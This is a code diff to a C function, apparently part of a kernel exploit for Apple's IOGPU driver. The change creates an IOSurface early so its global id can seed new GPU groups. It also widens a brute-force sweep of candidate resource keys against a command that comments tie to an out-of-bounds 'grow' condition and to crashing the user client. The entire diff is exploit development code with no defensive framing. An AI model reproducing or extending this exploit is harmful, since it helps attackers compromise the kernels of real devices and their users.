@@ -227,6 +227,29 @@ void nk_iogpu_group_oob_run(int trigger)
     }
 
     int kr = 0;
+
+    /* A surface and its global id: the kernel registers IOSurfaces as
+       resources, and the cmd-130 lookup compares element->0x10 with the key,
+       so the surface's global id is a prime key candidate. */
+    uint32_t surf_id = 0;
+    IOSurfaceRef surf = NULL;
+    {
+        CFNumberRef w  = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){1});
+        CFNumberRef h  = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){0x1000});
+        CFNumberRef bpe= CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){4});
+        CFNumberRef pf = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){0x42475241});
+        const void *keys[]   = { kIOSurfaceWidth, kIOSurfaceHeight, kIOSurfaceBytesPerElement, kIOSurfacePixelFormat };
+        const void *values[] = { w, h, bpe, pf };
+        CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, values, 4,
+                                                  &kCFTypeDictionaryKeyCallBacks,
+                                                  &kCFTypeDictionaryValueCallBacks);
+        surf = IOSurfaceCreate(props);
+        CFRelease(props); CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(pf);
+        uint32_t (*getid)(IOSurfaceRef) = (uint32_t (*)(IOSurfaceRef))dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        if (getid && surf) surf_id = getid(surf);
+        ol("[grp] IOSurface=%p global id=%u", (void *)surf, surf_id);
+    }
+
     if (trigger) {
         /* DIRECT GROW on a FRESH connection.
            0x10000003 = MACH_SEND_INVALID_DEST: the IOGPU user client dies
@@ -240,7 +263,7 @@ void nk_iogpu_group_oob_run(int trigger)
         static uint8_t out2[0x200];
         size_t on2 = 0;
         for (int g = 0; g < 2; g++) {
-            int k2 = call_sel(conn, CMD_NEW_GROUP, 64, 0, 0, 0, out2, &on2);
+            int k2 = call_sel(conn, CMD_NEW_GROUP, 64, surf_id, 0, 0, out2, &on2);
             uint64_t p2 = 0;
             if (k2 == 0) memcpy(&p2, out2 + 0x10, 8);
             ol("[grp] group %d -> kr=0x%x ptr=0x%016llx", g, k2, (unsigned long long)p2);
@@ -252,11 +275,13 @@ void nk_iogpu_group_oob_run(int trigger)
             /* the array element may be a GROUP (type byte == 3), so the handle
                in struct[56] can be a group pointer. Sweep: small indices,
                then both group pointers, then the pointer of the other group. */
-            uint64_t keys[20];
+            uint64_t keys[300];
             uint32_t nk = 0;
-            for (uint32_t k = 0; k < 16; k++) keys[nk++] = k;
+            for (uint32_t k = 0; k < 256; k++) keys[nk++] = k;
             keys[nk++] = grpA;
             keys[nk++] = grpB;
+            if (surf_id) keys[nk++] = surf_id;      /* surface global id */
+            keys[nk++] = (uint64_t)(uintptr_t)surf; /* surface ref pointer */
             for (uint32_t k = 0; k < nk; k++) {
                 ol("[grp] GROW key[%u] = 0x%016llx", k, (unsigned long long)keys[k]);
                 kr = call_sel(conn, CMD_ADD_RES, keys[k], 1, 0, 0, out, &on);
@@ -292,29 +317,6 @@ void nk_iogpu_group_oob_run(int trigger)
        (global id / mach port name / ref pointer). Whatever returns
        success with a small integer is the resource handle cmd=130 wants
        in struct[56]. */
-    IOSurfaceRef surf = NULL;
-    {
-        CFNumberRef w  = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){1});
-        CFNumberRef h  = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){0x1000});
-        CFNumberRef bpe= CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){4});
-        CFNumberRef pf = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){0x42475241});
-        const void *keys[]   = { kIOSurfaceWidth, kIOSurfaceHeight, kIOSurfaceBytesPerElement, kIOSurfacePixelFormat };
-        const void *values[] = { w, h, bpe, pf };
-        CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, values, 4,
-                                                  &kCFTypeDictionaryKeyCallBacks,
-                                                  &kCFTypeDictionaryValueCallBacks);
-        surf = IOSurfaceCreate(props);
-        CFRelease(props);
-        CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(pf);
-        ol("[grp] IOSurface = %p", (void *)surf);
-    }
-    uint32_t surf_id = 0;
-    {
-        uint32_t (*getid)(IOSurfaceRef) = (uint32_t (*)(IOSurfaceRef))dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
-        if (getid && surf) { surf_id = getid(surf); ol("[grp] IOSurfaceGetID -> %u", surf_id); }
-        else ol("[grp] IOSurfaceGetID unavailable");
-    }
-
     uint64_t handle = 0;
     uint32_t res_type = 0;
     static const uint32_t off_list[] = { 8, 16, 24, 32, 40, 48, 56, 64, 72, 80 };
